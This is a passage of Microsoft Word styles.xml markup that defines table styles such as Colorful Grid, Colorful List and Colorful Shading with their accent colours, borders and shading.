        <w:shd w:val="clear" w:color="auto" w:fill="DBDCDF" w:themeFill="accent3" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="797B87" w:themeFill="accent3" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="797B87" w:themeFill="accent3" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent4">
    <w:name w:val="Colorful Grid Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B8F9FF" w:themeFill="accent4" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="72F3FF" w:themeFill="accent4" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="72F3FF" w:themeFill="accent4" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="006D77" w:themeFill="accent4" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="006D77" w:themeFill="accent4" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent5">
    <w:name w:val="Colorful Grid Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="accent5" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="accent5" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="accent5" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="accent5" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="163D55" w:themeFill="accent5" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulGrid-Accent6">
    <w:name w:val="Colorful Grid Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="73"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B7EEFF" w:themeFill="accent6" w:themeFillTint="33"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6FDEFF" w:themeFill="accent6" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6FDEFF" w:themeFill="accent6" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="005771" w:themeFill="accent6" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="005771" w:themeFill="accent6" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList">
    <w:name w:val="Colorful List"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="text1" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="AD3D1B" w:themeFill="accent2" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="AD3D1B" w:themeColor="accent2" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="text1" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent1">
    <w:name w:val="Colorful List Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="EFF1F2" w:themeFill="accent1" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="AD3D1B" w:themeFill="accent2" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="AD3D1B" w:themeColor="accent2" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E0E2E5" w:themeFill="accent1" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent2">
    <w:name w:val="Colorful List Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="FBEDE8" w:themeFill="accent2" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="AD3D1B" w:themeFill="accent2" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="AD3D1B" w:themeColor="accent2" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F8DAD2" w:themeFill="accent2" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent3">
    <w:name w:val="Colorful List Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F6F6F7" w:themeFill="accent3" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="00747F" w:themeFill="accent4" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="00747F" w:themeColor="accent4" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDEDEF" w:themeFill="accent3" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent4">
    <w:name w:val="Colorful List Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="DCFCFF" w:themeFill="accent4" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="82848F" w:themeFill="accent3" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="82848F" w:themeColor="accent3" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B8F9FF" w:themeFill="accent4" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent5">
    <w:name w:val="Colorful List Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="accent5" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="005D79" w:themeFill="accent6" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="005D79" w:themeColor="accent6" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="accent5" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulList-Accent6">
    <w:name w:val="Colorful List Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="72"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="DBF6FF" w:themeFill="accent6" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:bottom w:val="single" w:sz="12" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="18415B" w:themeFill="accent5" w:themeFillShade="CC"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="18415B" w:themeColor="accent5" w:themeShade="CC"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E527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EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B7EEFF" w:themeFill="accent6" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading">
    <w:name w:val="Colorful Shading"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="text1" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="D94D2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23044" w:themeFill="text1" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="123044" w:themeColor="text1" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="12304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63D55" w:themeFill="text1" w:themeFillShade="BF"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="8ABFE0" w:themeFill="text1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent1">
    <w:name w:val="Colorful Shading Accent 1"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="24" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="4" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="4" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="4" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:insideH w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
        <w:insideV w:val="single" w:sz="4" w:space="0" w:color="FFFFFF" w:themeColor="background1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="EFF1F2" w:themeFill="accent1" w:themeFillTint="19"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="single" w:sz="24" w:space="0" w:color="D94D2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4449" w:themeFill="accent1" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:color w:val="FFFFFF" w:themeColor="background1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="single" w:sz="4" w:space="0" w:color="3E4449" w:themeColor="accent1" w:themeShade="99"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="3E444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E4449" w:themeFill="accent1" w:themeFillShade="99"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="C1C6CB" w:themeFill="accent1" w:themeFillTint="66"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="neCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="nwCell">
      <w:rPr>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="ColorfulShading-Accent2">
    <w:name w:val="Colorful Shading Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="71"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
